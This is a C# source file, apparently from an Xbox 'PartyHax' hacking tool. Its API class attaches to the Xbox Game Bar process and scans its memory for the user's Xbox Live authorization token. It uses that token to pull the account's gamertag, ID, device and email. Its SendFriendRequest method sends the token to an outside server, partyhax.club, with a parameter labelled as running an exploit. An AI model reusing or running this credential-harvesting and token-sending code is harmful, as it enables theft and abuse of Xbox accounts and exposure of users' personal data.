
using Leaf.xNet;
using Memory;
using Newtonsoft.Json.Linq;
using PartyHax.Helper.Config;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace PartyHax.Helper.Xbox
{
    public class API
    {
        public Mem m = new Mem();
        public AppSettings Config = new AppSettings();
        public bool AttachGamebar()
        {
            if (!Config.IsAttached)
            {
                Process.Start("explorer.exe", "ms-gamingoverlay://");
                Thread.Sleep(1000);
                m.OpenProcess("gamebar");
                return true;
            }
            return false;
        }
        public bool ValidateToken(string token)
        {
            try
            {
                using (var GetUser = new HttpRequest())
                {
                    GetUser.AddHeader("Authorization", token);
                    GetUser.AddHeader("Accept-Charset", "UTF-8");
                    GetUser.AddHeader("x-xbl-contract-version", "2");
                    GetUser.AddHeader("Accept", "application/json");
                    GetUser.AddHeader("Content-Type", "application/json");
                    GetUser.AddHeader("Host", "social.xboxlive.com");
                    GetUser.AddHeader("Expect", "100-continue");
                    GetUser.AddHeader("Connection", "Keep-Alive");
                    var response = GetUser.Get($"https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag");
                    if (response.IsOK)
                    {
                        MessageBox.Show($"Successfully Validated XBL Token!", "Successful", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        return true;
                    }
                }
            }
            catch (OverflowException)
            {
                MessageBox.Show("XBL Token Not Found During Scan, Please Try Again.", "[OVERFLOW] Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (HttpException)
            {
                MessageBox.Show("XBL Token Not Found, Try Again!", "[HTTP] Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (NullReferenceException)
            {
                MessageBox.Show("XBL Token Not Found, Try Again!", "[NULL] Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            return false;
        }
        public async void GetTokenFromMemory()
        {
            try
            {
                var XauthStartAddress = (await m.AoBScan("41 75 74 68 6F 72 69 7A 61 74 69 6F 6E 3A 20 58 42 4C 33 2E 30 20 78 3D", true, true)).FirstOrDefault();
                var XauthStartAddressHex = (XauthStartAddress + 15).ToString("X");
                IEnumerable<long> XauthEndScanList = await m.AoBScan("0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20", true, true);
                foreach (var XauthAddress in XauthEndScanList.ToArray())
                {
                    if (XauthAddress > XauthStartAddress)
                    {
                        Config.XauthLength = (XauthAddress - XauthStartAddress - 15);
                        break;
                    }

                }
                var token = Encoding.ASCII.GetString(m.ReadBytes(XauthStartAddressHex, Config.XauthLength));
                if (token != null && ValidateToken(token))
                {
                    Config.AuthToken = token;
                    MessageBox.Show($"XBL Token Found!\n{Config.AuthToken}", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (ArgumentNullException)
            {
                MessageBox.Show("XBL Token Not Found!, Try Again!", "[NULL] Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (OverflowException)
            {
                MessageBox.Show("XBL Token Not Found During Scan, Please Try Again.", "[OVERFLOW] Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public void GetProfilePic()
        {
            using (var GetPFP = new HttpRequest())
            {
                GetPFP.AddHeader("Authorization", Config.AuthToken);
                GetPFP.AddHeader("Accept-Encoding", "gzip, deflate");
                GetPFP.AddHeader("x-xbl-contract-version", "5");
                GetPFP.AddHeader("Accept", "application/json");
                GetPFP.AddHeader("Content-Type", "application/json");
                GetPFP.AddHeader("Host", "peoplehub.xboxlive.com");
                GetPFP.AddHeader("Connection", "Keep-Alive");
                GetPFP.AddHeader("signature", "AAAAAQHZ0KSooB/TQ+yRliNEK6HICXOWmZ3DzsLyUWNTy0d9qQ1voXWGLoyY6Rn4PgVMlxJ2d1FbW60twBMX4QxYgzl7af6wFXTM5Q==");
                GetPFP.AddHeader("accept-language", "en-US");
                var response = GetPFP.Get($"https://peoplehub.xboxlive.com/users/me/people/xuids({Config.UserID})/decoration/detail");
                if (!response.IsOK) return;
                JObject Json = JObject.Parse(response.ToString());
                Config.imageUrl = (string)Json["people"][0]["displayPicRaw"].ToString();
            }
        }
        public string GetDeviceType()
        {
            using (var Console = new HttpRequest())
            {
                Console.AddHeader("Authorization", Config.AuthToken);
                Console.AddHeader("Accept-Encoding", "gzip, deflate");
                Console.AddHeader("x-xbl-contract-version", "5");
                Console.AddHeader("Accept", "application/json");
                Console.AddHeader("Content-Type", "application/json");
                Console.AddHeader("Host", "peoplehub.xboxlive.com");
                Console.AddHeader("Connection", "Keep-Alive");
                Console.AddHeader("signature", "AAAAAQHZ0KSooB/TQ+yRliNEK6HICXOWmZ3DzsLyUWNTy0d9qQ1voXWGLoyY6Rn4PgVMlxJ2d1FbW60twBMX4QxYgzl7af6wFXTM5Q==");
                Console.AddHeader("accept-language", "en-US");
                var response = Console.Get($"https://peoplehub.xboxlive.com/users/me/people/xuids({Config.UserID})/decoration/presencedetail");
                if (response.IsOK)
                {
                    JObject Json = JObject.Parse(response.ToString());
                    string device = (string)Json["people"][0]["presenceDetails"][0]["Device"];
                    return device;


                }
            }
            return "null";
        }
        public void SendFriendRequest()
        {
            using (var AddUser = new HttpRequest())
            {
                AddUser.ReadWriteTimeout = 10000;
                AddUser.AddHeader("Connection", "Keep Alive");
                AddUser.AddHeader("xbltoken", Config.AuthToken);
                var response = AddUser.Get("https://partyhax.club/handler/api/api.php?key=public&action=xbox_add_friend&targetgamertag=run%20expioit");
                if (!response.IsOK) return;
            }
        }
        public void GetUser()
        {
            try
            {
                using (var GetUser = new HttpRequest())
                {
                    GetUser.AddHeader("Authorization", Config.AuthToken);
                    GetUser.AddHeader("Accept-Charset", "UTF-8");
                    GetUser.AddHeader("x-xbl-contract-version", "2");
                    GetUser.AddHeader("Accept", "application/json");
                    GetUser.AddHeader("Content-Type", "application/json");
                    GetUser.AddHeader("Host", "social.xboxlive.com");
                    GetUser.AddHeader("Expect", "100-continue");
                    GetUser.AddHeader("Connection", "Keep-Alive");
                    var response = GetUser.Get($"https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag");
                    if (!response.IsOK) return;
                    JObject Json = JObject.Parse(response.ToString());
                    Config.UserID = (string)Json["profileUsers"][0]["hostId"].ToString();
                    Config.GamerTag = (string)Json["profileUsers"][0]["settings"][0]["value"].ToString();

                }
            }
            catch (HttpException Error)
            {
                MessageBox.Show(Error.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (ArgumentException Error)
            {
                MessageBox.Show(Error.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        public void GetEmail()
        {
            try
            {        
                using (var GetEmail = new HttpRequest())
                {
                    GetEmail.AddHeader("x-xbl-contract-version", "3");
                    GetEmail.AddHeader("Accept-Encoding", "gzip; q=1.0, deflate; q=0.5, identity; q=0.1");
                    GetEmail.AddHeader("Accept", "application/json");
                    GetEmail.AddHeader("Authorization", Config.AuthToken);
                    GetEmail.AddHeader("Host", "accounts.xboxlive.com");
                    GetEmail.AddHeader("Connection", "Keep-Alive");
                    var response = GetEmail.Get($"https://accounts.xboxlive.com/family/memberXuid({Config.UserID})");
                    if (!response.IsOK) return;
                    JObject Json = JObject.Parse(response.ToString());
                    Config.Email = (string)Json["familyUsers"][0]["email"];
                }
            }
            catch (HttpException Error)
            {
                MessageBox.Show(Error.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (ArgumentException Error)
            {
                MessageBox.Show(Error.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}